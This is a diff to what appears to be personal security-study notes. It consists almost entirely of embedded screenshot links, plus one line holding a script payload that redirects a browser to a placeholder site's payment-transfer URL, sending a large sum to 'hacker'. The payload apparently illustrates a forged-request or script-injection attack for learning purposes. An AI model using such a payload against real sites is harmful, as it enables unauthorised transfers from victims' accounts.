@@ -19,3 +19,37 @@
 ![[Pasted image 20250130214344.png]]
 ![[Pasted image 20250130221508.png]]
 ![[Pasted image 20250130223433.png]]
+
+![[Pasted image 20250202194200.png]]
+![[Pasted image 20250202194309.png]]
+
+
+
+![[Pasted image 20250202205408.png]]
+![[Pasted image 20250202205615.png]]
+![[Pasted image 20250202205639.png]]
+![[Pasted image 20250202212113.png]]
+![[Pasted image 20250202212140.png]]
+![[Pasted image 20250202212824.png]]
+![[Pasted image 20250202212958.png]]
+![[Pasted image 20250202221133.png]]
+![[Pasted image 20250202221230.png]]![[Pasted image 20250202221343.png]]
+![[Pasted image 20250202221453.png]]
+
+![[Pasted image 20250202221655.png]]
+<script> document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000'; </script>
+
+![[Pasted image 20250203212847.png]]
+
+
+![[Pasted image 20250203221835.png]]
+![[Pasted image 20250203222331.png]]
+
+![[Pasted image 20250204200736.png]]![[Pasted image 20250204200758.png]]
+![[Pasted image 20250204205203.png]]
+![[Pasted image 20250204205216.png]]
+
+
+![[Pasted image 20250204212039.png]]
+![[Pasted image 20250204212249.png]]![[Pasted image 20250204221946.png]]
+![[Pasted image 20250204221959.png]]
